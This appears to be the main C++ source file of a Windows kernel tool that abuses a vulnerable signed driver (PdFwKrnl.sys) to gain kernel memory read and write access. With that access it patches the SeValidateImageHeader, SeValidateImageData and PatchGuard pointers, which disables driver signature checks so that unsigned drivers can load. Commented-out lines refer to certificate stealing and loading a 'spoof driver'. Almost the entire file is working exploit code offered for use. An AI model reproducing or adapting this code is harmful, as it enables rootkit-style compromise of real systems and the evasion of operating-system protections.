#include <iostream>
#include <string>
#include "byovd.h"
#include "kernel_utils.h"
#include "pattern.h"
#include "loadup.h"
#include "certsteal.h"
#include "bytes.h"

int main(int argc, char* argv[])
{
	auto base_addr = KernelUtils::ntoskrnl_base();
	// load driver
	//driver::stealcert(rawData, sizeof(rawData), false);


	//⠀⢸⠂⠀⠀⠀⠘⣧⠀⠀⣟⠛⠲⢤⡀⠀⠀⣰⠏⠀⠀⠀⠀⠀⢹⡀
	//	⠀⡿⠀⠀⠀⠀⠀⠈⢷⡀⢻⡀⠀⠀⠙⢦⣰⠏⠀⠀⠀⠀⠀⠀⢸⠀
	//	⠀⡇⠀⠀⠀⠀⠀⠀⢀⣻⠞⠛⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⢸⠀
	//	⠀⡇⠀⠀⠀⠀⠀⠀⠛⠓⠒⠓⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
	//	⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀
	//	⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⢀⡟⠀
	//	⠀⠘⣇⠀⠘⣿⠋⢹⠛⣿⡇⠀⠀⠀⠀⣿⣿⡇⠀⢳⠉⠀⣠⡾⠁⠀
	//	⣦⣤⣽⣆⢀⡇⠀⢸⡇⣾⡇⠀⠀⠀⠀⣿⣿⡷⠀⢸⡇⠐⠛⠛⣿⠀
	//	⠹⣦⠀⠀⠸⡇⠀⠸⣿⡿⠁⢀⡀⠀⠀⠿⠿⠃⠀⢸⠇⠀⢀⡾⠁⠀
	//	⠀⠈⡿⢠⢶⣡⡄⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⣴⣧⠆⠀⢻⡄⠀⠀
	//	⠀⢸⠃⠀⠘⠉⠀⠀⠀⠠⣄⡴⠲⠶⠴⠃⠀⠀⠀⠉⡀⠀⠀⢻⡄⠀
	//	⠀⠘⠒⠒⠻⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠞⠛⠒⠛⠋⠁⠀
	//	⠀⠀⠀⠀⠀⠀⠸⣟⠓⠒⠂⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀
	//	⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀
	//	⠀⠀⠀⠀⠀⠀⠀⣼⣃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀
	//	⠀⠀⠀⠀⠀⠀⠀⠉⣹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀
	//	⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀



	// - Made by your favorite hyena oracl~ :3




















	auto SeValidateImageHeader_offset = KernelUtils::get_sevalidateimageheader_offset();


	auto SeValidateImageData_offset = KernelUtils::get_sevalidateimagedata_offset();


	auto offset_ret = KernelUtils::get_ret_offset();


	auto patchguard_value_offset = KernelUtils::get_patchguardvalue_offset();


	auto PatchGuard_offset = KernelUtils::get_patchguard_offset();


	DWORD64 CURRENTVAL;
	DWORD64 CURRENTVAL2;
	DWORD64 CURRENTVAL3;




	BYOVD_PROVIDER byovd_provider("PdFwKrnl.sys", "PdFwKrnl");

	// Calculate addresses
	auto addr_offset_ret = base_addr + offset_ret;
	auto addr_patchguard_value = base_addr + patchguard_value_offset;

	// Read original values
	uint64_t original_sevalidateimageheader;
	uint64_t original_sevalidateimagedata;
	uint64_t original_patchguard;

	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	const char* sourcePath = "C:\\Windows\\System32\\MicroNT.sys";
	const char* destPath = "C:\\Windows\\System32\\Drivers\\MicroNT.sys";

	byovd_provider.ReadVirtualMemory(base_addr + SeValidateImageHeader_offset, &original_sevalidateimageheader, 8);
	byovd_provider.ReadVirtualMemory(base_addr + SeValidateImageData_offset, &original_sevalidateimagedata, 8);
	byovd_provider.ReadVirtualMemory(base_addr + PatchGuard_offset, &original_patchguard, 8);

	// Write new values
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageHeader_offset, &addr_offset_ret, 8);
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageData_offset, &addr_offset_ret, 8);
	byovd_provider.WriteVirtualMemory(base_addr + PatchGuard_offset, &addr_patchguard_value, 8);

	//driver::stealcert(spoofer, sizeof(spoofer), false);
	//driver::load("C:\\Users\\jnerf\\source\\repos\\minimalist_spoof_driver\\x64\\Release\\minimalist_spoof_driver.sys", "minimalist_production");

	std::cout << "[*] done!" << std::endl;
	std::cout << "[*] press enter to revert values!" << std::endl;
	getchar();
	// Restore original values
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageHeader_offset, &original_sevalidateimageheader, 8);
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageData_offset, &original_sevalidateimagedata, 8);
	byovd_provider.WriteVirtualMemory(base_addr + PatchGuard_offset, &original_patchguard, 8);

	std::cout << "[*] original values restored!" << std::endl;
	//byovd_provider.remove_service();
	//driver::unload("minimalist_km");
	return 0;
}
